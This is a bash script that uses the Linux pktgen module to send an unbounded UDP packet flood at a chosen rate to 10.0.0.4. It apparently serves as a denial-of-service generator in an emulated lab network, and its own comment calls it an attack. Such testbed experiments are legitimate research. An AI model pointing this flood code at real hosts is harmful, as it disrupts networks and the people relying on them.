#!/bin/bash
# attack at different pps

function pgset() {
    local result
    echo $1 > $PGDEV
    result=`cat $PGDEV | fgrep "Result: OK:"`
    if [ "$result" = "" ]; then
        cat $PGDEV | fgrep Result:
    fi
}

function pg() {
    echo inject > $PGDEV
    cat $PGDEV
}

function rand(){
    min=$1
    max=$(($2-$min+1))
    num=$(($RANDOM+1000000000))
    echo $(($num%$max+$min))
}

if [[ `lsmod | grep pktgen` == "" ]];then
    modprobe pktgen
fi

name=`ifconfig | head -1 | awk -F \t '{print $1}' | awk -F - '{print $1}'`
ip='10.0.0.'${name:((${#var} - 1))}

mac='00:00:00:00:00:0'${name:((${#var} - 1))}
device=`ifconfig | head -1 | awk '{OFS="\t"}{print $1}'`
pps=$1

# ip
PGDEV=/proc/net/pktgen/kpktgend_0
BASIC_DELAY=1000000000
pgset "rem_device_all"
pgset "add_device $device"
pgset "max_before_softirq 10000"
PGDEV=/proc/net/pktgen/$device

pgset "pkt_size 60"
pgset "src_mac $mac"
pgset "src_min $ip"
pgset "src_max $ip"
pgset "dst_min 10.0.0.4"
pgset "dst_max 10.0.0.4"
pgset "udp_src_min 2"
pgset "udp_src_max 65535"
pgset "udp_dst_min 2"
pgset "udp_dst_max 65530"
pgset "dst_mac 00:00:00:00:00:04"
pgset "clone_skb 2"

# pgset "dst_mac_count 8"
PGDEV=/proc/net/pktgen/$device
delay=`expr ${BASIC_DELAY} / $pps`
pgset "count 0"
pgset "clone_skb 2"
pgset "delay $delay"
PGDEV=/proc/net/pktgen/pgctrl
pgset "start"
